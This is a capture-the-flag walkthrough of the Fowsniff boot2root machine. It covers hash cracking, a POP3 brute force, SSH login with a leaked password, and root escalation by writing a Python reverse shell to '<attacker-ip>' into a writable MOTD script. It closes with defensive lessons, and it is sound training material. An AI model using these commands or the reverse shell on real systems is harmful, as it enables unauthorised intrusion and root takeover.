---
title: "Fowsniff"
description: "A boot2root CTF machine simulating a corporate breach scenario — crack MD5 password hashes, access POP3 email to find SSH credentials, and escalate to root via a writable MOTD script."
difficulty: "Easy"
tags: ["OSINT", "MD5", "Hash Cracking", "POP3", "MOTD", "Privilege Escalation"]
date: "2026-07-04"
---

## Overview

Fowsniff is a TryHackMe boot2root machine from VulnHub that simulates a corporate security breach. Attackers have compromised Fowsniff Corp's Twitter account and leaked employee password hashes online. The challenge involves OSINT to find the leaked data, cracking MD5 hashes, accessing internal email via POP3 to discover SSH credentials, and escalating privileges through a writable Message of the Day (MOTD) script that executes as root.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** OSINT, MD5 hash cracking, POP3 enumeration, MOTD privilege escalation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

Four open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.18 |
| 110/tcp | POP3 | Dovecot pop3d |
| 143/tcp | IMAP | Dovecot imapd |

![Nmap scan results](/assets/screenshots/fowsniff/nmap.png)

### Web Enumeration

The web server on port 80 showed a defaced Fowsniff Corp homepage. The page announced that the company had been hacked and their official Twitter account was compromised:

![Defaced Fowsniff Corp website](/assets/screenshots/fowsniff/webpage.png)

Directory brute-forcing revealed several files:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
```

Notable findings included `/security.txt`, `/robots.txt`, and `/README.txt`.

### OSINT — Twitter and Pastebin

Visiting the company's Twitter account (`@fowsniffcorp`) confirmed the breach. The hacked account contained a tweet linking to a Pastebin page with leaked employee data:

![Compromised Twitter account](/assets/screenshots/fowsniff/twitter.png)

The Pastebin contained email addresses and MD5 password hashes for nine employees:

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

![Pastebin with leaked hashes](/assets/screenshots/fowsniff/pastebin.png)

## Hash Cracking

The hashes were MD5, a fast and insecure algorithm. Cracked them using John the Ripper with the `rockyou.txt` wordlist:

```bash
john hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```

Eight of the nine hashes cracked successfully:

![Hash cracking results](/assets/screenshots/fowsniff/hashcracking.png)

The cracked passwords provided a credential set for accessing the corporate POP3 email server.

## Initial Access — POP3 Email

### Brute-Forcing POP3

Used the cracked credentials to brute-force POP3 login on port 110. This can be done with Metasploit's `pop3_login` module, Hydra, or direct telnet attempts:

```bash
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE pass.txt
exploit
```

![POP3 brute force](/assets/screenshots/fowsniff/pop3_bruteforce.png)

The brute force succeeded with the user **seina**.

### Reading Internal Email

Connected to the POP3 service directly using telnet:

```bash
telnet <target-ip> 110
USER seina
PASS <cracked-password>
LIST
```

Two emails were waiting in seina's mailbox:

![POP3 email access](/assets/screenshots/fowsniff/pop3_email.png)

**Email 1 (from stone@fowsniff):** An urgent security notice explaining the breach. It contained a critical detail — a temporary SSH password set for system access:

```
The temporary password for SSH is "S1ck3nBluff+secureshell"
```

![Email with SSH password](/assets/screenshots/fowsniff/email_ssh_pass.png)

**Email 2 (from baksteen@fowsniff):** Casual banter about a management incident. While not containing credentials, it revealed the sender's name (Skyler) and confirmed the username **baksteen** was a colleague of seina.

### SSH Access

With the username `baksteen` and the temporary password, logged into the system via SSH:

```bash
ssh baksteen@<target-ip>
```

![SSH login as baksteen](/assets/screenshots/fowsniff/ssh_login.png)

## Privilege Escalation

### Group Enumeration

Checked the current user's group memberships:

```bash
id
```

The `baksteen` user belonged to the `users` group. Searched for files writable by this group:

```bash
find / -group users -type f 2>/dev/null
```

![Finding cube.sh](/assets/screenshots/fowsniff/find_cube.png)

A single interesting file appeared: `/opt/cube/cube.sh`. This script displayed the ASCII art cube banner shown during SSH login — it was part of the Message of the Day (MOTD) system.

### Understanding the MOTD Chain

The MOTD (Message of the Day) is displayed when a user logs into SSH. On Ubuntu, scripts in `/etc/update-motd.d/` are executed sequentially as root to generate the dynamic MOTD content.

Checked the `00-header` script:

```bash
cat /etc/update-motd.d/00-header
```

It contained a line executing the cube script:

```bash
sh /opt/cube/cube.sh
```

![MOTD configuration showing cube.sh execution](/assets/screenshots/fowsniff/motd_config.png)

This meant that every time any user logged in via SSH, `/opt/cube/cube.sh` was executed **as the root user**. Since `baksteen` (and the `users` group) had write permissions on this file, we could replace its contents with a reverse shell payload.

### Injecting the Reverse Shell

Edited `/opt/cube/cube.sh` and replaced its contents with a Python reverse shell one-liner:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![Editing cube.sh with reverse shell](/assets/screenshots/fowsniff/edit_cube.png)

### Triggering the Payload

Started a netcat listener on the attacker machine:

```bash
nc -lvnp 1234
```

Then logged out of the current SSH session and initiated a new connection. As the MOTD scripts ran during the new login, `cube.sh` executed with root privileges and connected back:

![Reverse shell as root](/assets/screenshots/fowsniff/rev_shell.png)

### Root Flag

With a root shell, navigated to the root directory and retrieved the final flag:

```bash
cd /root
cat flag.txt
```

![Root flag](/assets/screenshots/fowsniff/root_flag.png)

## Flags

| Flag | Location |
|------|----------|
| User | `/home/seina/user.txt` |
| Root | `/root/flag.txt` |

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
john hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
# POP3 brute force (Metasploit)
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE pass.txt
exploit
# POP3 manual access
telnet <target-ip> 110
USER seina
PASS <password>
LIST
RETR 1
# SSH access
ssh baksteen@<target-ip>
# Privilege escalation
find / -group users -type f 2>/dev/null
cat /etc/update-motd.d/00-header
echo 'python3 -c "..."' > /opt/cube/cube.sh
nc -lvnp 1234
ssh baksteen@<target-ip>
cat /root/flag.txt
```

## Lessons Learned

- **OSINT is a valid reconnaissance phase.** Real breaches often leak data to Pastebin, GitHub, or social media. The compromised Twitter account was the key to the entire attack chain.
- **MD5 is unsuitable for password storage.** All nine hashes were cracked in seconds with a standard wordlist. Modern systems should use bcrypt, Argon2, or at minimum SHA-256 with a salt.
- **POP3 in cleartext is dangerous.** The POP3 service transmitted credentials and email content without encryption (no TLS). An attacker on the same network could sniff all traffic, including the SSH password.
- **MOTD scripts run as root.** The `/etc/update-motd.d/` mechanism executes scripts with root privileges. Any writable script referenced within this chain is a direct path to privilege escalation.
- **Always check group-writable files.** The `find / -group <groupname> -type f` pattern is a reliable way to discover files that a user can modify but that execute in a higher-privilege context.
- **Defense in depth:** The SSH temporary password should have been changed immediately, and the cube.sh script should never have been group-writable. A proper implementation would restrict permissions to root-only.

## References

- [TryHackMe — Fowsniff](https://tryhackme.com/room/fowsniff)
- [VulnHub — Fowsniff](https://www.vulnhub.com/entry/fowsniff-1,262/)
- [Fowsniff Corp Pastebin (mirror)](https://pastebin.com/NrAqVeeX)
- [GTFOBins — Reverse Shell](https://gtfobins.github.io/)
- [Ubuntu MOTD — update-motd.d](https://manpages.ubuntu.com/manpages/focal/man5/update-motd.5.html)
